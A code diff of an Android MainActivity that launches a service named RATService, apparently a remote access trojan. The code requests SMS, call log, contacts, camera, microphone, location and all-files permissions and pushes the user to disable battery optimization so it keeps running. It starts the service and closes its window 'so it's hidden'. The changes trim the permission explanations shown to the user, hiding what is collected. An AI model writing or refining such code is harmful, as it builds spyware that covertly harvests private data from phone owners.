@@ -29,7 +29,6 @@ public class MainActivity extends AppCompatActivity {
     private static final int PERMISSION_REQUEST_CODE = 100;
     private static final int BATTERY_OPTIMIZATION_REQUEST_CODE = 200;
     private static final int MANAGE_STORAGE_REQUEST_CODE = 300;
-    private static final int SYSTEM_ALERT_WINDOW_REQUEST_CODE = 400;
     
     // Base permissions for all Android versions
     private final String[] basePermissions = {
@@ -42,15 +41,11 @@ public class MainActivity extends AppCompatActivity {
         Manifest.permission.READ_CALL_LOG,
         Manifest.permission.READ_CONTACTS,
         Manifest.permission.READ_PHONE_STATE,
+        Manifest.permission.FOREGROUND_SERVICE,
         Manifest.permission.POST_NOTIFICATIONS,
         Manifest.permission.SCHEDULE_EXACT_ALARM,
         Manifest.permission.USE_EXACT_ALARM,
-        Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-        Manifest.permission.FOREGROUND_SERVICE,
-        Manifest.permission.FOREGROUND_SERVICE_CAMERA,  // CRITICAL for camera in foreground service
-        Manifest.permission.FOREGROUND_SERVICE_MICROPHONE,
-        Manifest.permission.FOREGROUND_SERVICE_LOCATION,
-        Manifest.permission.FOREGROUND_SERVICE_DATA_SYNC
+        Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
     };
     
     // Android 13+ (API 33+) specific permissions
@@ -61,7 +56,8 @@ public class MainActivity extends AppCompatActivity {
         android.Manifest.permission.NEARBY_WIFI_DEVICES,
         android.Manifest.permission.BLUETOOTH_CONNECT,
         android.Manifest.permission.BLUETOOTH_SCAN,
-        android.Manifest.permission.BODY_SENSORS
+        android.Manifest.permission.BODY_SENSORS,
+        android.Manifest.permission.POST_NOTIFICATIONS
     };
     
     // Android 12 (API 31-32) specific permissions
@@ -100,14 +96,6 @@ public class MainActivity extends AppCompatActivity {
             if (!Environment.isExternalStorageManager()) {
                 requestManageStoragePermission();
                 return; // Wait for the result before checking other permissions
-            }
-        }
-        
-        // Check if we need SYSTEM_ALERT_WINDOW permission for overlay features
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (!Settings.canDrawOverlays(this)) {
-                requestSystemAlertWindowPermission();
-                return;
             }
         }
         
@@ -171,37 +159,21 @@ public class MainActivity extends AppCompatActivity {
         StringBuilder message = new StringBuilder();
         message.append("This app needs the following permissions:\n\n");
         
-        if (permissionsNeeded.contains(android.Manifest.permission.CAMERA)) {
-            message.append("📷 Camera - To take photos and access camera\n");
-        }
-        
-        if (permissionsNeeded.contains(android.Manifest.permission.FOREGROUND_SERVICE_CAMERA)) {
-            message.append("📷 Background Camera - To use camera while in background\n");
-        }
-        
         if (permissionsNeeded.contains(android.Manifest.permission.READ_MEDIA_IMAGES) ||
             permissionsNeeded.contains(android.Manifest.permission.READ_MEDIA_VIDEO)) {
-            message.append("🖼️ Photos & Videos - To access and save media files\n");
+            message.append("• Photos and Videos - To access and save media files\n");
         }
         
         if (permissionsNeeded.contains(android.Manifest.permission.NEARBY_WIFI_DEVICES)) {
-            message.append("📡 Nearby devices - To scan for Wi-Fi networks and Bluetooth devices\n");
+            message.append("• Nearby devices - To scan for Wi-Fi networks and Bluetooth devices\n");
         }
         
         if (permissionsNeeded.contains(android.Manifest.permission.POST_NOTIFICATIONS)) {
-            message.append("🔔 Notifications - To show service status\n");
-        }
-        
-        if (permissionsNeeded.contains(android.Manifest.permission.ACCESS_FINE_LOCATION)) {
-            message.append("📍 Location - For GPS tracking features\n");
-        }
-        
-        if (permissionsNeeded.contains(android.Manifest.permission.RECORD_AUDIO)) {
-            message.append("🎤 Microphone - For audio recording\n");
+            message.append("• Notifications - To show service status\n");
         }
         
         new AlertDialog.Builder(this)
-            .setTitle("📱 Permissions Required")
+            .setTitle("Additional Permissions Required")
             .setMessage(message.toString())
             .setPositiveButton("Continue", (dialog, which) -> {
                 ActivityCompat.requestPermissions(this, 
@@ -220,7 +192,7 @@ public class MainActivity extends AppCompatActivity {
             try {
                 // Show explanation dialog first
                 new AlertDialog.Builder(this)
-                    .setTitle("💾 Storage Permission Required")
+                    .setTitle("Storage Permission Required")
                     .setMessage("This app needs access to all files to browse folders like " +
                                "Download, Documents, and custom folders. Please grant 'All files access' " +
                                "in the next screen.")
@@ -252,30 +224,6 @@ public class MainActivity extends AppCompatActivity {
         }
     }
     
-    private void requestSystemAlertWindowPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            try {
-                new AlertDialog.Builder(this)
-                    .setTitle("🪟 Overlay Permission Required")
-                    .setMessage("This app needs overlay permission to show important alerts and status overlays.")
-                    .setPositiveButton("Grant", (dialog, which) -> {
-                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                                Uri.parse("package:" + getPackageName()));
-                        startActivityForResult(intent, SYSTEM_ALERT_WINDOW_REQUEST_CODE);
-                    })
-                    .setNegativeButton("Skip", (dialog, which) -> {
-                        checkAndRequestPermissions();
-                    })
-                    .show();
-            } catch (Exception e) {
-                e.printStackTrace();
-                checkAndRequestPermissions();
-            }
-        } else {
-            checkAndRequestPermissions();
-        }
-    }
-    
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                            @NonNull int[] grantResults) {
@@ -283,83 +231,53 @@ public class MainActivity extends AppCompatActivity {
         
         if (requestCode == PERMISSION_REQUEST_CODE) {
             boolean allGranted = true;
-            StringBuilder grantedPermissions = new StringBuilder();
             StringBuilder deniedPermissions = new StringBuilder();
             
             for (int i = 0; i < permissions.length; i++) {
-                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
-                    grantedPermissions.append("✅ ").append(getPermissionDescription(permissions[i])).append("\n");
-                } else {
+                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                     allGranted = false;
-                    deniedPermissions.append("❌ ").append(getPermissionDescription(permissions[i])).append("\n");
+                    deniedPermissions.append(getPermissionDescription(permissions[i])).append("\n");
                 }
             }
             
             if (allGranted) {
-                Toast.makeText(this, "✅ All permissions granted!", Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "All permissions granted!", Toast.LENGTH_SHORT).show();
                 allPermissionsGranted();
             } else {
                 // Some permissions denied, show warning but still try to start service
-                String message = "Some features may be limited:\n" + deniedPermissions.toString();
+                Toast.makeText(this, 
+                    "Some permissions denied. Some features may not work:\n" + deniedPermissions.toString(), 
+                    Toast.LENGTH_LONG).show();
                 
-                new AlertDialog.Builder(this)
-                    .setTitle("⚠️ Permissions Partially Granted")
-                    .setMessage(message)
-                    .setPositiveButton("Continue", (dialog, which) -> {
-                        // Check if we need to request MANAGE_EXTERNAL_STORAGE again
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                            if (!Environment.isExternalStorageManager()) {
-                                requestManageStoragePermission();
-                                return;
-                            }
-                        }
-                        allPermissionsGranted(); // Still try to start service with whatever permissions we have
-                    })
-                    .setNegativeButton("Exit", (dialog, which) -> {
-                        finish();
-                    })
-                    .show();
+                // Check if we need to request MANAGE_EXTERNAL_STORAGE again
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    if (!Environment.isExternalStorageManager()) {
+                        requestManageStoragePermission();
+                        return;
+                    }
+                }
+                
+                allPermissionsGranted(); // Still try to start service with whatever permissions we have
             }
         }
     }
     
     private String getPermissionDescription(String permission) {
         switch (permission) {
-            case Manifest.permission.CAMERA:
-                return "Camera";
-            case Manifest.permission.FOREGROUND_SERVICE_CAMERA:
-                return "Background Camera Access";
-            case Manifest.permission.RECORD_AUDIO:
-                return "Microphone";
-            case Manifest.permission.ACCESS_FINE_LOCATION:
-            case Manifest.permission.ACCESS_COARSE_LOCATION:
-                return "Location";
-            case Manifest.permission.READ_SMS:
-                return "Read SMS";
-            case Manifest.permission.SEND_SMS:
-                return "Send SMS";
-            case Manifest.permission.READ_CALL_LOG:
-                return "Call Logs";
-            case Manifest.permission.READ_CONTACTS:
-                return "Contacts";
-            case Manifest.permission.READ_PHONE_STATE:
-                return "Phone State";
-            case Manifest.permission.POST_NOTIFICATIONS:
-                return "Notifications";
             case android.Manifest.permission.READ_MEDIA_IMAGES:
-                return "Read Images";
             case android.Manifest.permission.READ_MEDIA_VIDEO:
-                return "Read Videos";
-            case android.Manifest.permission.READ_MEDIA_AUDIO:
-                return "Read Audio";
+                return "• Photos & Videos";
             case android.Manifest.permission.NEARBY_WIFI_DEVICES:
-                return "Nearby Wi-Fi Devices";
-            case Manifest.permission.READ_EXTERNAL_STORAGE:
-                return "Read Storage";
-            case Manifest.permission.WRITE_EXTERNAL_STORAGE:
-                return "Write Storage";
+                return "• Nearby devices";
+            case android.Manifest.permission.CAMERA:
+                return "• Camera";
+            case android.Manifest.permission.RECORD_AUDIO:
+                return "• Microphone";
+            case android.Manifest.permission.ACCESS_FINE_LOCATION:
+            case android.Manifest.permission.ACCESS_COARSE_LOCATION:
+                return "• Location";
             default:
-                return permission.substring(permission.lastIndexOf('.') + 1);
+                return "• " + permission.substring(permission.lastIndexOf('.') + 1);
         }
     }
     
@@ -374,29 +292,18 @@ public class MainActivity extends AppCompatActivity {
                 String packageName = getPackageName();
                 
                 if (pm.isIgnoringBatteryOptimizations(packageName)) {
-                    Toast.makeText(this, "✅ Battery optimization disabled. App will run more reliably.", 
+                    Toast.makeText(this, "Battery optimization disabled. App will run more reliably.", 
                         Toast.LENGTH_LONG).show();
                 }
             }
-            // Continue with other permissions
-            checkAndRequestPermissions();
         } else if (requestCode == MANAGE_STORAGE_REQUEST_CODE) {
             // Check if user granted MANAGE_EXTERNAL_STORAGE permission
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                 if (Environment.isExternalStorageManager()) {
-                    Toast.makeText(this, "✅ All files access granted!", Toast.LENGTH_SHORT).show();
+                    Toast.makeText(this, "All files access granted!", Toast.LENGTH_SHORT).show();
                 } else {
-                    Toast.makeText(this, "⚠️ All files access not granted. Some folders may not be accessible.", 
+                    Toast.makeText(this, "All files access not granted. Some folders may not be accessible.", 
                         Toast.LENGTH_LONG).show();
-                }
-            }
-            // Continue with regular permissions
-            checkAndRequestPermissions();
-        } else if (requestCode == SYSTEM_ALERT_WINDOW_REQUEST_CODE) {
-            // Check if user granted overlay permission
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                if (Settings.canDrawOverlays(this)) {
-                    Toast.makeText(this, "✅ Overlay permission granted!", Toast.LENGTH_SHORT).show();
                 }
             }
             // Continue with regular permissions
@@ -423,10 +330,9 @@ public class MainActivity extends AppCompatActivity {
             if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                 // Show a dialog explaining why user should disable battery optimization
                 new AlertDialog.Builder(this)
-                    .setTitle("🔋 Battery Optimization")
+                    .setTitle("Battery Optimization")
                     .setMessage("For the app to work properly in the background, please disable battery optimization. " +
-                               "This ensures the service continues running even when the device is idle, " +
-                               "and allows the camera to function correctly.")
+                               "This ensures the service continues running even when the device is idle.")
                     .setPositiveButton("Disable", (dialog, which) -> {
                         requestIgnoreBatteryOptimizations();
                     })
@@ -542,10 +448,6 @@ public class MainActivity extends AppCompatActivity {
     
     private void startRATService() {
         Intent serviceIntent = new Intent(this, RATService.class);
-        
-        // Add flags to ensure service starts properly
-        serviceIntent.setAction("START_SERVICE");
-        
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent);
         } else {
@@ -553,7 +455,7 @@ public class MainActivity extends AppCompatActivity {
         }
         
         // Optional: Show a message
-        Toast.makeText(this, "✅ RAT Service Started", Toast.LENGTH_SHORT).show();
+        Toast.makeText(this, "RAT Service Started", Toast.LENGTH_SHORT).show();
         
         // Close activity immediately (so it's hidden)
         finish();
